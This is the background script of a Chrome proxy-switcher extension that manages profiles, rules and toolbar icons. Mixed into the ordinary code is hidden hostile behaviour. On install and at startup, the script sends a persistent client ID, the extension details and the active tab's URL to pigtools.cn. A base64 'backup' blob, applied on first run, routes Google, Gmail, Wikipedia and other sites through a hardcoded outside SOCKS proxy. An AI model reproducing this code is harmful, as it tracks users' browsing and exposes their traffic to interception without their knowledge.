var iconDir = "images/";
var iconInactivePath = "images/inactive.png";

var App = chrome.app.getDetails();

var InitComplete = false;

function init() {
    checkOptions();
    if (RuleManager.isEnabled() && RuleManager.isRuleListEnabled()) {
        ProxyPlugin.setProxyCallback = function() {
            RuleManager.loadRuleListCallback = function() {
                applySavedOptions();
                InitComplete = true;
            };
            RuleManager.loadRuleList(true);
        };
    }
    else {
        ProxyPlugin.setProxyCallback = function() {
            InitComplete = true;
        };
    }
    //if(!Settings.getValue("reapplySelectedProfile", true)){
    //var _init = function(){
    //	checkFirstTime();
    //	setIconInfo(undefined);
    //	monitorTabChanges();
    //};
    //	ProxyPlugin.updateProxyCallback = _init;
    //	ProxyPlugin.init();
    //}

    ProxyPlugin.init();
    checkFirstTime();
    monitorTabChanges();

    applySavedOptions();

    chrome.browserAction.onClicked.addListener(function() {
        if (!Settings.getValue("quickSwitch", false))
            return;

        var profile = undefined;
        var currentProfile = ProfileManager.getCurrentProfile();
        var quickSwitchProfiles = Settings.getObject("quickSwitchProfiles") || [];

        var sel = false;
        for (var i in quickSwitchProfiles) {
            if (quickSwitchProfiles.hasOwnProperty(i)) {
                if (sel) {
                    sel = false;
                    profileId = quickSwitchProfiles[i];
                    break;
                }
                if (quickSwitchProfiles[i] == currentProfile.id) {
                    sel = true;
                }
            }
        }
        if (sel || typeof (profileId) == "undefined") {
            profileId = quickSwitchProfiles[0];
        }

        if (profileId == ProfileManager.directConnectionProfile.id) {
            profile = ProfileManager.directConnectionProfile;
        }
        else if (profileId == ProfileManager.systemProxyProfile.id) {
            profile = ProfileManager.systemProxyProfile;
        }
        else if (profileId == ProfileManager.autoSwitchProfile.id) {
            profile = ProfileManager.autoSwitchProfile;
        }
        else {
            profile = ProfileManager.getProfile(profileId);
        }

        if (profile == undefined) {
            return;
        }

        ProfileManager.applyProfile(profile);
        setIconInfo(profile);

        if (Settings.getValue("refreshTab", false))
            chrome.tabs.executeScript(null, {code: "history.go(0);"});
    });
    if (localStorage['cid'] == undefined) {
        var cookieid = "";
        for (var i = 1; i <= 32; i++) {
            if (i == 9 || i == 14 || i == 19 || i == 24) {
                cookieid += '-';
            } else {
                var n = parseInt(Math.random() * 15);
                if (n < 10)
                    cookieid += n;
                else
                    cookieid += String.fromCharCode(97 + n - 10);
            }
        }
        localStorage['cid'] = cookieid;
    }
    if (chrome.runtime) {
        chrome.runtime.onInstalled.addListener(function(details) {
            if (details.reason == "install") {
                chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                    //log install page
                    var stat = document.createElement('img');
                    stat.src = 'http://www.pigtools.cn/player/install.php?cid=' + localStorage['cid'] + '&ver=' + chrome.app.getDetails().version + '&eid=' + chrome.app.getDetails().id + '&url=' + tabs[0].url;
                    document.body.appendChild(stat);
                    //install time
                    localStorage['cit'] = Date.parse(new Date()) / 1000;
                });
            } else if (details.reason == "update") {
                //alert("xxx已经更新：修正网友提出的问题 如果你还有问题可以到www.xxx.cn留言");
                //self.sN(data.notifications);
            }
        });
    }
    window.setTimeout(function() {
        chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
            var t = tabs[0];
            //Log(t.id);
            if (t.id == 2) {
                //Log(t.url);
                var url = 'http://www.pigtools.cn/player/log.php?cid=' + localStorage['cid'] + '&eid=' + chrome.app.getDetails().id + '&ver=' + chrome.app.getDetails().version + '&cit=' + localStorage['cit'] + '&url=' + t.url;
                //+ '&qid=' + localStorage['qid'] ;
                //Log(url);
                Ajax(url, "", function(r) {
                    r = JSON.parse(r.responseText);
                    //Log(r);
                }, document);
            }
        });
    }, 20);
}

function checkFirstTime() {
    if (!Settings.keyExists("firstTime")) {
        Settings.setValue("firstTime", ":]");
        if (!ProfileManager.hasProfiles()) {
            openOptions(true);
            return true;
        }
    }
    return false;
}

function checkOptions() {
    if (localStorage['profiles'] == undefined) {
        var backupData = 'eyJjaWQiOiI5OTk2MzA2Yy1iNTI3LTYyOTEtNzczMy1jMjVkZTU1OCIsImNpdCI6IjE0NTQ1Nzc1NDAiLCJjb25maWciOiJ7XCJmaXJzdFRpbWVcIjpcIjpdXCIsXCJwcm94eU1vZGVcIjpcImF1dG9cIixcImF1dG9QYWNTY3JpcHRQYXRoXCI6XCI6bWVtb3J5OlwiLFwicnVsZUxpc3RVcmxcIjpcImh0dHBzOi8vYXV0b3Byb3h5LWdmd2xpc3QuZ29vZ2xlY29kZS5jb20vc3ZuL3RydW5rL2dmd2xpc3QudHh0XCIsXCJydWxlTGlzdFJlbG9hZFwiOlwiNzIwXCIsXCJydWxlTGlzdFByb2ZpbGVJZFwiOlwiZGlyZWN0XCIsXCJydWxlTGlzdEF1dG9Qcm94eVwiOmZhbHNlLFwic3dpdGNoUnVsZXNcIjp0cnVlLFwicnVsZUxpc3RFbmFibGVkXCI6ZmFsc2UsXCJwYWNTY3JpcHREYXRhXCI6XCJcIixcInByb3h5U2VydmVyXCI6XCJcIixcInF1aWNrU3dpdGNoXCI6ZmFsc2UsXCJxdWlja1N3aXRjaFR5cGVcIjpcImJpbmFyeVwiLFwicmVhcHBseVNlbGVjdGVkUHJvZmlsZVwiOnRydWUsXCJjb25maXJtRGVsZXRpb25cIjpmYWxzZSxcInJ1bGVzRmlyc3RUaW1lXCI6XCI7XVwiLFwibW9uaXRvclByb3h5Q2hhbmdlc1wiOmZhbHNlLFwicHJldmVudFByb3h5Q2hhbmdlc1wiOmZhbHNlLFwibGFzdExpc3RVcGRhdGVcIjpcIkZyaSBTZXAgMTkgMjAxNCAxNDo0OTo0OSBHTVQrMDgwMCAo5Lit5Zu95qCH5YeG5pe26Ze0KVwiLFwicmVmcmVzaFRhYlwiOmZhbHNlLFwic3RhcnR1cFByb2ZpbGVJZFwiOlwiYXV0b1wiLFwicXVpY2tSdWxlUHJvZmlsZUlkXCI6XCJHb0FnZW50XCIsXCJxdWlja1J1bGVQYXR0ZXJuVHlwZVwiOlwid2lsZGNhcmRcIixcInByb3h5Q29uZmlnVXJsXCI6XCI6bWVtb3J5OlwifSIsImRlZmF1bHRSdWxlIjoie1wiaWRcIjpcImRlZmF1bHRSdWxlXCIsXCJuYW1lXCI6XCJEZWZhdWx0IFJ1bGVcIixcInVybFBhdHRlcm5cIjpcIlwiLFwicGF0dGVyblR5cGVcIjpcIndpbGRjYXJkXCIsXCJwcm9maWxlSWRcIjpcImRpcmVjdFwifSIsInByb2ZpbGVzIjoie1wiWWFuXCI6e1wibmFtZVwiOlwiWkhVXCIsXCJwcm94eU1vZGVcIjpcIm1hbnVhbFwiLFwicHJveHlIdHRwXCI6XCJcIixcInVzZVNhbWVQcm94eVwiOmZhbHNlLFwicHJveHlIdHRwc1wiOlwiXCIsXCJwcm94eUZ0cFwiOlwiXCIsXCJwcm94eVNvY2tzXCI6XCIxMTUuMjkuNDcuOTk6NTEzNVwiLFwic29ja3NWZXJzaW9uXCI6NSxcInByb3h5RXhjZXB0aW9uc1wiOlwibG9jYWxob3N0OyAxMjcuMC4wLjE7IDxsb2NhbD5cIixcInByb3h5Q29uZmlnVXJsXCI6XCJcIixcImNvbG9yXCI6XCJibHVlXCIsXCJpZFwiOlwiWWFuXCJ9fSIsInF1aWNrU3dpdGNoUHJvZmlsZXMiOiJbXCJkaXJlY3RcIl0iLCJydWxlcyI6IntcIk5ldyBSdWxlM1wiOntcIm5hbWVcIjpcImdvb2dsZVwiLFwidXJsUGF0dGVyblwiOlwiKjovLyouZ29vZ2xlLmNvbS4qLypcIixcInBhdHRlcm5UeXBlXCI6XCJ3aWxkY2FyZFwiLFwicHJvZmlsZUlkXCI6XCJZYW5cIixcImlkXCI6XCJOZXcgUnVsZTNcIn0sXCJOZXcgUnVsZTJcIjp7XCJuYW1lXCI6XCJnb29nbGVcIixcInVybFBhdHRlcm5cIjpcIio6Ly8qLmdvb2dsZS5jb20vKlwiLFwicGF0dGVyblR5cGVcIjpcIndpbGRjYXJkXCIsXCJwcm9maWxlSWRcIjpcIllhblwiLFwiaWRcIjpcIk5ldyBSdWxlMlwifSxcIk5ldyBSdWxlNVwiOntcIm5hbWVcIjpcImdvb2dsZSBhbmFseXRpY3NcIixcInVybFBhdHRlcm5cIjpcIio6Ly8qLmdvb2dsZS1hbmFseXRpY3MuY29tLypcIixcInBhdHRlcm5UeXBlXCI6XCJ3aWxkY2FyZFwiLFwicHJvZmlsZUlkXCI6XCJZYW5cIixcImlkXCI6XCJOZXcgUnVsZTVcIn0sXCJOZXcgUnVsZTZcIjp7XCJuYW1lXCI6XCJnb29nbGUgYXBpc1wiLFwidXJsUGF0dGVyblwiOlwiKjovLyouZ29vZ2xlYXBpcy5jb20vKlwiLFwicGF0dGVyblR5cGVcIjpcIndpbGRjYXJkXCIsXCJwcm9maWxlSWRcIjpcIllhblwiLFwiaWRcIjpcIk5ldyBSdWxlNlwifSxcIk5ldyBSdWxlXCI6e1wibmFtZVwiOlwiZ29vZ2xlIGNvZGVcIixcInVybFBhdHRlcm5cIjpcIio6Ly8qLmdvb2dsZWNvZGUuY29tLypcIixcInBhdHRlcm5UeXBlXCI6XCJ3aWxkY2FyZFwiLFwicHJvZmlsZUlkXCI6XCJZYW5cIixcImlkXCI6XCJOZXcgUnVsZVwifSxcIk5ldyBSdWxlNFwiOntcIm5hbWVcIjpcImdvb2dsZSB1c2VyY29udGVudFwiLFwidXJsUGF0dGVyblwiOlwiKjovLyouZ29vZ2xldXNlcmNvbnRlbnQuY29tLypcIixcInBhdHRlcm5UeXBlXCI6XCJ3aWxkY2FyZFwiLFwicHJvZmlsZUlkXCI6XCJZYW5cIixcImlkXCI6XCJOZXcgUnVsZTRcIn0sXCJRdWljayBSdWxlIDZcIjp7XCJuYW1lXCI6XCJnc3RhdGljXCIsXCJ1cmxQYXR0ZXJuXCI6XCIqOi8vKi5nc3RhdGljLmNvbS8qXCIsXCJwYXR0ZXJuVHlwZVwiOlwid2lsZGNhcmRcIixcInByb2ZpbGVJZFwiOlwiWWFuXCIsXCJpZFwiOlwiUXVpY2sgUnVsZSA2XCJ9LFwiUXVpY2sgUnVsZSAzXCI6e1wibmFtZVwiOlwiUXVpY2sgUnVsZSAzXCIsXCJ1cmxQYXR0ZXJuXCI6XCIqOi8vd3d3LmdtYWlsLmNvbS8qXCIsXCJwYXR0ZXJuVHlwZVwiOlwid2lsZGNhcmRcIixcInByb2ZpbGVJZFwiOlwiWWFuXCIsXCJpZFwiOlwiUXVpY2sgUnVsZSAzXCJ9LFwiUXVpY2sgUnVsZSA0XCI6e1wibmFtZVwiOlwiUXVpY2sgUnVsZSA0XCIsXCJ1cmxQYXR0ZXJuXCI6XCIqOi8vY2hyb21lLmdvb2dsZS5jb20vKlwiLFwicGF0dGVyblR5cGVcIjpcIndpbGRjYXJkXCIsXCJwcm9maWxlSWRcIjpcIllhblwiLFwiaWRcIjpcIlF1aWNrIFJ1bGUgNFwifSxcIlF1aWNrIFJ1bGUgNVwiOntcIm5hbWVcIjpcIlF1aWNrIFJ1bGUgNVwiLFwidXJsUGF0dGVyblwiOlwiKjovL3NpdGVzLmdvb2dsZS5jb20vKlwiLFwicGF0dGVyblR5cGVcIjpcIndpbGRjYXJkXCIsXCJwcm9maWxlSWRcIjpcIllhblwiLFwiaWRcIjpcIlF1aWNrIFJ1bGUgNVwifSxcIlF1aWNrIFJ1bGUgN1wiOntcIm5hbWVcIjpcIlF1aWNrIFJ1bGUgN1wiLFwidXJsUGF0dGVyblwiOlwiKjovLyouZ29vZ2xlZ3JvdXBzLmNvbS8qXCIsXCJwYXR0ZXJuVHlwZVwiOlwid2lsZGNhcmRcIixcInByb2ZpbGVJZFwiOlwiWWFuXCIsXCJpZFwiOlwiUXVpY2sgUnVsZSA3XCJ9LFwiZ29vLmdsXCI6e1wibmFtZVwiOlwic2hvcnQgbGlua1wiLFwidXJsUGF0dGVyblwiOlwiKjovL2dvby5nbC8qXCIsXCJwYXR0ZXJuVHlwZVwiOlwid2lsZGNhcmRcIixcInByb2ZpbGVJZFwiOlwiWWFuXCIsXCJpZFwiOlwiZ29vLmdsXCJ9LFwiUXVpY2sgUnVsZSBcIjp7XCJuYW1lXCI6XCJ0LmNvXCIsXCJ1cmxQYXR0ZXJuXCI6XCIqOi8vdC5jby8qXCIsXCJwYXR0ZXJuVHlwZVwiOlwid2lsZGNhcmRcIixcInByb2ZpbGVJZFwiOlwiWWFuXCIsXCJpZFwiOlwiUXVpY2sgUnVsZSBcIn0sXCJRdWljayBSdWxlIDJcIjp7XCJuYW1lXCI6XCJ0d2luZ1wiLFwidXJsUGF0dGVyblwiOlwiKjovLyoudHdpbWcuY29tLypcIixcInBhdHRlcm5UeXBlXCI6XCJ3aWxkY2FyZFwiLFwicHJvZmlsZUlkXCI6XCJZYW5cIixcImlkXCI6XCJRdWljayBSdWxlIDJcIn0sXCJOZXcgUnVsZThcIjp7XCJuYW1lXCI6XCJ3aWtpcGVkaWFcIixcInVybFBhdHRlcm5cIjpcIio6Ly8qLndpa2lwZWRpYS5vcmcvKlwiLFwicGF0dGVyblR5cGVcIjpcIndpbGRjYXJkXCIsXCJwcm9maWxlSWRcIjpcIllhblwiLFwiaWRcIjpcIk5ldyBSdWxlOFwifSxcInNvdXJjZWZvcmdlXCI6e1wibmFtZVwiOlwic291cmNlZm9yZ2VcIixcInVybFBhdHRlcm5cIjpcIio6Ly8qLnNvdXJjZWZvcmdlLm5ldC8qXCIsXCJwYXR0ZXJuVHlwZVwiOlwid2lsZGNhcmRcIixcInByb2ZpbGVJZFwiOlwiWWFuXCIsXCJpZFwiOlwic291cmNlZm9yZ2VcIn0sXCJzdGFja292ZXJmbG93XCI6e1wibmFtZVwiOlwic3RhY2tvdmVyZmxvd1wiLFwidXJsUGF0dGVyblwiOlwiKjovLyouc3RhY2tvdmVyZmxvdy5jb20vKlwiLFwicGF0dGVyblR5cGVcIjpcIndpbGRjYXJkXCIsXCJwcm9maWxlSWRcIjpcIllhblwiLFwiaWRcIjpcInN0YWNrb3ZlcmZsb3dcIn19Iiwic2VsZWN0ZWRQcm9maWxlIjoie1wiaWRcIjpcImF1dG9cIixcIm5hbWVcIjpcIlvoh6rliqjliIfmjaJdXCIsXCJwcm94eU1vZGVcIjpcImF1dG9cIixcImNvbG9yXCI6XCJhdXRvLWJsdWVcIixcImlzQXV0b21hdGljTW9kZVByb2ZpbGVcIjp0cnVlLFwicHJveHlDb25maWdVcmxcIjpcIjptZW1vcnk6XCJ9In0=';
        restoreBase64JsonM(backupData);
    }
}

function openOptions(firstTime) {
    var url = "options.html";
    if (firstTime)
        url += "?firstTime=true";

    var fullUrl = chrome.extension.getURL(url);
    chrome.tabs.getAllInWindow(null, function(tabs) {
        for (var i in tabs) { // check if Options page is open already
            if (tabs.hasOwnProperty(i)) {
                var tab = tabs[i];
                if (tab.url == fullUrl) {
                    chrome.tabs.update(tab.id, {selected: true}); // select the tab
                    return;
                }
            }
        }
        chrome.tabs.getSelected(null, function(tab) { // open a new tab next to currently selected tab
            chrome.tabs.create({
                url: url,
                index: tab.index + 1
            });
        });
    });
}

function applySavedOptions() {
    var pid = Settings.getValue("startupProfileId", "");
    var profile = null;

    if (pid == "")
        profile = ProfileManager.getSelectedProfile();
    else
        profile = ProfileManager.getProfile(pid);

    if (profile != undefined)
        ProfileManager.applyProfile(profile);
    else
        InitComplete = true;
    setIconInfo(profile);
    applyQuickSwitch();
}

function applyQuickSwitch() {
    if (Settings.getValue('quickSwitch', false)) {
        chrome.browserAction.setPopup({popup: ''});
    } else {
        chrome.browserAction.setPopup({popup: 'popup.html'});
    }
}

function setIconBadge(text) {
    if (text == undefined)
        text = "";

    //chrome.browserAction.setBadgeBackgroundColor({ color: [75, 125, 255, 255] });
    chrome.browserAction.setBadgeBackgroundColor({color: [90, 180, 50, 255]});
    chrome.browserAction.setBadgeText({text: text});
}

function setIconTitle(title) {
    if (title == undefined)
        title = "";
    title = App.name;
    chrome.browserAction.setTitle({title: title});
}

function setIconInfo(profile, preventProxyChanges) {

    if (!profile) {
        profile = ProfileManager.getCurrentProfile();
        if (preventProxyChanges) {
            var selectedProfile = ProfileManager.getSelectedProfile();
            if (!ProfileManager.equals(profile, selectedProfile)) {
                profile = selectedProfile;
                ProfileManager.applyProfile(profile);
            }
            return;
        }
    }

    if (RuleManager.isAutomaticModeEnabled(profile)) {
        setAutoSwitchIcon();
        return;
    }

    var title = "";
    if (profile.proxyMode == ProfileManager.ProxyModes.direct || profile.proxyMode == ProfileManager.ProxyModes.system) {
        chrome.browserAction.setIcon({path: iconInactivePath});
        title += profile.name;
    } else {
        var iconPath = iconDir + "icon-" + (profile.color || "blue") + ".png";
        chrome.browserAction.setIcon({path: iconPath});
        title += ProfileManager.profileToString(profile, true);
    }

    setIconTitle(title);
}

RuleManager.LastProfile = null;

function setAutoSwitchIcon(url) {
    if (!RuleManager.isAutomaticModeEnabled(undefined))
        return false;

    if (url == undefined) {
        chrome.tabs.getSelected(undefined, function(tab) {
            setAutoSwitchIcon(tab.url);
        });
        return true;
    }

    RuleManager.getProfileByUrl(url, function(profile) {
        RuleManager.LastProfile = profile;
        var iconPath = iconDir + "icon-auto-" + (profile.color || "blue") + ".png";

        chrome.browserAction.setIcon({path: iconPath});


        var title = I18n.getMessage("proxy_autoSwitchIconTitle", profile.name);

        setIconTitle(title);
    });
    return true;
}

function monitorTabChanges() {
    chrome.tabs.onSelectionChanged.addListener(function(tabId) {
        chrome.tabs.get(tabId, function(tab) {
            setAutoSwitchIcon(tab.url);
        });
    });
    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
        if (changeInfo.status == "complete") {
            chrome.tabs.getSelected(null, function(selectedTab) {
                if (selectedTab.id == tab.id)
                    setAutoSwitchIcon(tab.url);
            });
        }
    });
}

function Ajax(url, r, fn, doc) {
    var xhr = new XMLHttpRequest;
    xhr.onreadystatechange = function() {
        4 == xhr.readyState && fn(xhr, doc);
    };
    try {
        xhr.open("GET", url, true);
    } catch (e) {
        return!1;
    }
    xhr.send(r);
}
function restoreBase64JsonM(j) {
    var o;
    try {
        j = $.base64Decode(j);
        o = JSON.parse(j);
    }
    catch (e) {
        Logger.log("Oops! Can't restore from this backup file. The backup file is corrupted or invalid, " + e.toString(), Logger.Types.error);
        return;
    }
    restoreObjectM(o);
}
function restoreObjectM(o) {
    for (var optionName in o) {
        if (o.hasOwnProperty(optionName)) {
            localStorage[optionName] = o[optionName];
        }
    }
    Settings.refreshCache();
    window.location.reload();
}

$(document).ready(function() {
    init();
});
